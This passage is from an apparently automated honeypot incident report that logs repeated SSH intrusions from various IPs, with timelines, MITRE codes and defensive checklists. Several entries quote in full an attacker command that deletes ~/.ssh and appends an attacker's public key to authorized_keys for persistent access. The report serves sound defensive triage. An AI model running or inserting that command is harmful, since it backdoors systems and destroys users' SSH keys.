- [ ] Block `49.229.102[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a11909837314

| Field | Detail |
|---|---|
| **Source IP** | `49.229.102[.]187` |
| **First Seen** | 2026-09-21 16:25 |
| **Last Seen** | 2026-09-21 16:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:25:56` | `cowrie.session.connect` |
| `2026-09-21 16:25:56` | `cowrie.client.version` |
| `2026-09-21 16:25:56` | `cowrie.client.kex` |
| `2026-09-21 16:25:59` | `cowrie.login.success` |
| `2026-09-21 16:25:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.229.102[.]187` to AbuseIPDB if not already reported
- [ ] Block `49.229.102[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fbf004fc47d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]113` |
| **First Seen** | 2026-09-21 16:49 |
| **Last Seen** | 2026-09-21 16:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:49:38` | `cowrie.session.connect` |
| `2026-09-21 16:49:38` | `cowrie.client.version` |
| `2026-09-21 16:49:38` | `cowrie.client.kex` |
| `2026-09-21 16:49:39` | `cowrie.login.success` |
| `2026-09-21 16:49:40` | `cowrie.session.params` |
| `2026-09-21 16:49:40` | `cowrie.command.input` |
| `2026-09-21 16:49:40` | `cowrie.command.failed` |
| `2026-09-21 16:49:40` | `cowrie.log.closed` |
| `2026-09-21 16:49:40` | `cowrie.session.params` |
| `2026-09-21 16:49:40` | `cowrie.command.input` |
| `2026-09-21 16:49:40` | `cowrie.session.file_download` |
| `2026-09-21 16:49:40` | `cowrie.log.closed` |
| `2026-09-21 16:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]113` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8157d6c46e7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]113` |
| **First Seen** | 2026-09-21 16:49 |
| **Last Seen** | 2026-09-21 16:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:49:41` | `cowrie.session.connect` |
| `2026-09-21 16:49:41` | `cowrie.client.version` |
| `2026-09-21 16:49:41` | `cowrie.client.kex` |
| `2026-09-21 16:49:41` | `cowrie.login.success` |
| `2026-09-21 16:49:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]113` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be1445640287

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]113` |
| **First Seen** | 2026-09-21 16:49 |
| **Last Seen** | 2026-09-21 16:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:49:41` | `cowrie.session.connect` |
| `2026-09-21 16:49:41` | `cowrie.client.version` |
| `2026-09-21 16:49:41` | `cowrie.client.kex` |
| `2026-09-21 16:49:42` | `cowrie.login.success` |
| `2026-09-21 16:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]113` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad1cc4984011

| Field | Detail |
|---|---|
| **Source IP** | `103.151.140[.]79` |
| **First Seen** | 2026-09-21 16:51 |
| **Last Seen** | 2026-09-21 16:51 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:51:19` | `cowrie.session.connect` |
| `2026-09-21 16:51:19` | `cowrie.client.version` |
| `2026-09-21 16:51:20` | `cowrie.client.kex` |
| `2026-09-21 16:51:22` | `cowrie.login.success` |
| `2026-09-21 16:51:25` | `cowrie.session.params` |
| `2026-09-21 16:51:25` | `cowrie.command.input` |
| `2026-09-21 16:51:25` | `cowrie.command.failed` |
| `2026-09-21 16:51:27` | `cowrie.log.closed` |
| `2026-09-21 16:51:28` | `cowrie.session.params` |
| `2026-09-21 16:51:28` | `cowrie.command.input` |
| `2026-09-21 16:51:28` | `cowrie.session.file_download` |
| `2026-09-21 16:51:28` | `cowrie.log.closed` |
| `2026-09-21 16:51:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.151.140[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.151.140[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf851f520860

| Field | Detail |
|---|---|
| **Source IP** | `103.151.140[.]79` |
| **First Seen** | 2026-09-21 16:51 |
| **Last Seen** | 2026-09-21 16:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:51:29` | `cowrie.session.connect` |
| `2026-09-21 16:51:31` | `cowrie.client.version` |
| `2026-09-21 16:51:31` | `cowrie.client.kex` |
| `2026-09-21 16:51:32` | `cowrie.login.success` |
| `2026-09-21 16:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.151.140[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.151.140[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1712ce802a8

| Field | Detail |
|---|---|
| **Source IP** | `103.151.140[.]79` |
| **First Seen** | 2026-09-21 16:51 |
| **Last Seen** | 2026-09-21 16:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:51:34` | `cowrie.session.connect` |
| `2026-09-21 16:51:34` | `cowrie.client.version` |
| `2026-09-21 16:51:34` | `cowrie.client.kex` |
| `2026-09-21 16:51:38` | `cowrie.login.success` |
| `2026-09-21 16:51:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.151.140[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.151.140[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7836ce076534

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-21 16:52 |
| **Last Seen** | 2026-09-21 16:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:52:53` | `cowrie.session.connect` |
| `2026-09-21 16:52:53` | `cowrie.client.version` |
| `2026-09-21 16:52:53` | `cowrie.client.kex` |
| `2026-09-21 16:52:53` | `cowrie.login.success` |
| `2026-09-21 16:52:53` | `cowrie.direct-tcpip.request` |
| `2026-09-21 16:52:53` | `cowrie.direct-tcpip.data` |
| `2026-09-21 16:52:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b38aa0149123

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-09-21 16:56 |
| **Last Seen** | 2026-09-21 16:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:56:33` | `cowrie.session.connect` |
| `2026-09-21 16:56:33` | `cowrie.client.version` |
| `2026-09-21 16:56:33` | `cowrie.client.kex` |
| `2026-09-21 16:56:33` | `cowrie.login.success` |
| `2026-09-21 16:56:34` | `cowrie.session.params` |
| `2026-09-21 16:56:34` | `cowrie.command.input` |
| `2026-09-21 16:56:34` | `cowrie.command.failed` |
| `2026-09-21 16:56:34` | `cowrie.log.closed` |
| `2026-09-21 16:56:35` | `cowrie.session.params` |
| `2026-09-21 16:56:35` | `cowrie.command.input` |
| `2026-09-21 16:56:35` | `cowrie.session.file_download` |
| `2026-09-21 16:56:35` | `cowrie.log.closed` |
| `2026-09-21 16:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e4a663d1596

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-09-21 16:56 |
| **Last Seen** | 2026-09-21 16:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:56:35` | `cowrie.session.connect` |
| `2026-09-21 16:56:35` | `cowrie.client.version` |
| `2026-09-21 16:56:35` | `cowrie.client.kex` |
| `2026-09-21 16:56:36` | `cowrie.login.success` |
| `2026-09-21 16:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a9a3dd4e8ac

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-09-21 16:56 |
| **Last Seen** | 2026-09-21 16:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:56:36` | `cowrie.session.connect` |
| `2026-09-21 16:56:36` | `cowrie.client.version` |
| `2026-09-21 16:56:36` | `cowrie.client.kex` |
| `2026-09-21 16:56:36` | `cowrie.login.success` |
| `2026-09-21 16:56:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c70031c64221

| Field | Detail |
|---|---|
| **Source IP** | `62.212.70[.]129` |
| **First Seen** | 2026-09-21 16:58 |
| **Last Seen** | 2026-09-21 16:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:58:11` | `cowrie.session.connect` |
| `2026-09-21 16:58:11` | `cowrie.client.version` |
| `2026-09-21 16:58:11` | `cowrie.client.kex` |
| `2026-09-21 16:58:12` | `cowrie.login.success` |
| `2026-09-21 16:58:12` | `cowrie.session.params` |
| `2026-09-21 16:58:12` | `cowrie.command.input` |
| `2026-09-21 16:58:12` | `cowrie.command.failed` |
| `2026-09-21 16:58:13` | `cowrie.log.closed` |
| `2026-09-21 16:58:13` | `cowrie.session.params` |
| `2026-09-21 16:58:13` | `cowrie.command.input` |
| `2026-09-21 16:58:13` | `cowrie.session.file_download` |
| `2026-09-21 16:58:13` | `cowrie.log.closed` |
| `2026-09-21 16:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.212.70[.]129` to AbuseIPDB if not already reported
- [ ] Block `62.212.70[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c57fc16f958

| Field | Detail |
|---|---|
| **Source IP** | `62.212.70[.]129` |
| **First Seen** | 2026-09-21 16:58 |
| **Last Seen** | 2026-09-21 16:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:58:13` | `cowrie.session.connect` |
| `2026-09-21 16:58:13` | `cowrie.client.version` |
| `2026-09-21 16:58:14` | `cowrie.client.kex` |
| `2026-09-21 16:58:14` | `cowrie.login.success` |
| `2026-09-21 16:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.212.70[.]129` to AbuseIPDB if not already reported
- [ ] Block `62.212.70[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a4889dbccd5

| Field | Detail |
|---|---|
| **Source IP** | `62.212.70[.]129` |
| **First Seen** | 2026-09-21 16:58 |
| **Last Seen** | 2026-09-21 16:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 16:58:14` | `cowrie.session.connect` |
| `2026-09-21 16:58:14` | `cowrie.client.version` |
| `2026-09-21 16:58:14` | `cowrie.client.kex` |
| `2026-09-21 16:58:15` | `cowrie.login.success` |
| `2026-09-21 16:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.212.70[.]129` to AbuseIPDB if not already reported
- [ ] Block `62.212.70[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38113119f1cf

| Field | Detail |
|---|---|
| **Source IP** | `14.225.206[.]171` |
| **First Seen** | 2026-09-21 17:03 |
| **Last Seen** | 2026-09-21 17:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:03:16` | `cowrie.session.connect` |
| `2026-09-21 17:03:16` | `cowrie.client.version` |
| `2026-09-21 17:03:16` | `cowrie.client.kex` |
| `2026-09-21 17:03:17` | `cowrie.login.success` |
| `2026-09-21 17:03:18` | `cowrie.session.params` |
| `2026-09-21 17:03:18` | `cowrie.command.input` |
| `2026-09-21 17:03:18` | `cowrie.command.failed` |
| `2026-09-21 17:03:19` | `cowrie.log.closed` |
| `2026-09-21 17:03:20` | `cowrie.session.params` |
| `2026-09-21 17:03:20` | `cowrie.command.input` |
| `2026-09-21 17:03:20` | `cowrie.session.file_download` |
| `2026-09-21 17:03:20` | `cowrie.log.closed` |
| `2026-09-21 17:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.206[.]171` to AbuseIPDB if not already reported
- [ ] Block `14.225.206[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3512f390baae

| Field | Detail |
|---|---|
| **Source IP** | `14.225.206[.]171` |
| **First Seen** | 2026-09-21 17:03 |
| **Last Seen** | 2026-09-21 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:03:21` | `cowrie.session.connect` |
| `2026-09-21 17:03:21` | `cowrie.client.version` |
| `2026-09-21 17:03:21` | `cowrie.client.kex` |
| `2026-09-21 17:03:22` | `cowrie.login.success` |
| `2026-09-21 17:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.206[.]171` to AbuseIPDB if not already reported
- [ ] Block `14.225.206[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4a6974c3bb7

| Field | Detail |
|---|---|
| **Source IP** | `14.225.206[.]171` |
| **First Seen** | 2026-09-21 17:03 |
| **Last Seen** | 2026-09-21 17:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:03:23` | `cowrie.session.connect` |
| `2026-09-21 17:03:23` | `cowrie.client.version` |
| `2026-09-21 17:03:23` | `cowrie.client.kex` |
| `2026-09-21 17:03:24` | `cowrie.login.success` |
| `2026-09-21 17:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.206[.]171` to AbuseIPDB if not already reported
- [ ] Block `14.225.206[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a4e61ceaeb

| Field | Detail |
|---|---|
| **Source IP** | `180.93.144[.]27` |
| **First Seen** | 2026-09-21 17:05 |
| **Last Seen** | 2026-09-21 17:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:05:22` | `cowrie.session.connect` |
| `2026-09-21 17:05:22` | `cowrie.client.version` |
| `2026-09-21 17:05:22` | `cowrie.client.kex` |
| `2026-09-21 17:05:23` | `cowrie.login.success` |
| `2026-09-21 17:05:24` | `cowrie.session.params` |
| `2026-09-21 17:05:24` | `cowrie.command.input` |
| `2026-09-21 17:05:24` | `cowrie.command.failed` |
| `2026-09-21 17:05:25` | `cowrie.log.closed` |
| `2026-09-21 17:05:26` | `cowrie.session.params` |
| `2026-09-21 17:05:26` | `cowrie.command.input` |
| `2026-09-21 17:05:26` | `cowrie.session.file_download` |
| `2026-09-21 17:05:26` | `cowrie.log.closed` |
| `2026-09-21 17:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.144[.]27` to AbuseIPDB if not already reported
- [ ] Block `180.93.144[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e4df0cead3c

| Field | Detail |
|---|---|
| **Source IP** | `180.93.144[.]27` |
| **First Seen** | 2026-09-21 17:05 |
| **Last Seen** | 2026-09-21 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:05:26` | `cowrie.session.connect` |
| `2026-09-21 17:05:26` | `cowrie.client.version` |
| `2026-09-21 17:05:27` | `cowrie.client.kex` |
| `2026-09-21 17:05:28` | `cowrie.login.success` |
| `2026-09-21 17:05:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.144[.]27` to AbuseIPDB if not already reported
- [ ] Block `180.93.144[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfa7189d070e

| Field | Detail |
|---|---|
| **Source IP** | `180.93.144[.]27` |
| **First Seen** | 2026-09-21 17:05 |
| **Last Seen** | 2026-09-21 17:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 17:05:28` | `cowrie.session.connect` |
| `2026-09-21 17:05:28` | `cowrie.client.version` |
| `2026-09-21 17:05:29` | `cowrie.client.kex` |
| `2026-09-21 17:05:30` | `cowrie.login.success` |
| `2026-09-21 17:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.144[.]27` to AbuseIPDB if not already reported
- [ ] Block `180.93.144[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7bd08eecb84

| Field | Detail |
|---|---|
| **Source IP** | `186.248.197[.]77` |
| **First Seen** | 2026-09-21 17:05 |
| **Last Seen** | 2026-09-21 17:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
